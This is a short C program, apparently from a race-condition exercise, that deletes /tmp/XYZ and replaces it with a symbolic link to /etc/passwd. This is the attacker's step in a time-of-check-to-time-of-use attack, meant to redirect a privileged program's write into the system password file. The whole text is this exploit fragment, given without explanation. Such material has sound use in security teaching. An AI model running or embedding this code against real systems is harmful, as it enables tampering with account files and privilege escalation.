int main(){

unlink("/tmp/XYZ");
symlink("/etc/passwd","/tmp/XYZ");
return 0;

}
